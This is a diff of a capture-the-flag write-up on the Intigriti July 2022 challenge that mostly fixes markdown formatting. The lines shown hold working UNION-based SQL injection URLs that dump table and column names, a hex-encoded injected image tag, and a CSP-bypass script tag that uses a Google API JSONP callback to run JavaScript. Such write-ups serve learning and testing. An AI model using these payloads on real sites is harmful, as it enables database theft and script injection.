@@ -59,22 +59,21 @@ Noticed the reflection on 2,3,5 by union select clause
 Query used : https://challenge-0722.intigriti.io/challenge/challenge.php?month=1%20union%20select%20null,group_concat(table_name),null,null,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--%20-#
 ```
 
-<p>• We came to an understanding there are three tables "post,user,youtube"! Now onto dumping the columns and contents.<p>
+<p>• We came to an understanding there are three tables "post,user,youtube"! Now onto dumping the columns and contents.</p>
 
 <img src="https://raw.githubusercontent.com/kabilan1290/kabilan1290.github.io/master/assets/img/whole.png">
 
 <p>• The above is the structure database > tables > column </p>
 
 
-<code>
- Queries Used:
+```
+Queries Used:
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x75736572-- -
 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x706f7374-- -
 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select null,column_name,null,null,null from information_schema.columns where table_name=0x796f7574756265-- -
-</code>
-
+```
 <p>• Note : I hex encoded the values of table name since the query escapes any special characters and throws error.</p>
 
 <p>• After spending some time on examining data from each column, nothing been found except i was rickrolled on youtubeid :| </p>
@@ -86,7 +85,7 @@ https://challenge-0722.intigriti.io/challenge/challenge.php?month=1 union select
 <p>• Then tried to inject my content on the reflected 2,3 and 5th columns.</p>
 
 ```
-query used : 
+Query used : 
 https://challenge-0722.intigriti.io/challenge/challenge.php?month=3 union select 1,0x3c696d67207372633d313e,0x3c696d67207372633d313e,4,0x3c696d67207372633d313e -- -
 ```
  
@@ -213,9 +212,9 @@ Query Used:
 
 <p>• Then i found the working endpoint on https://brutelogic.com.br/blog/csp-bypass-guidelines/</p>
 
-<code>
+```
 <Script Src=https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)></Script>
-</code>
+```
 
 <p>• Now time to frame the query !</p>
 
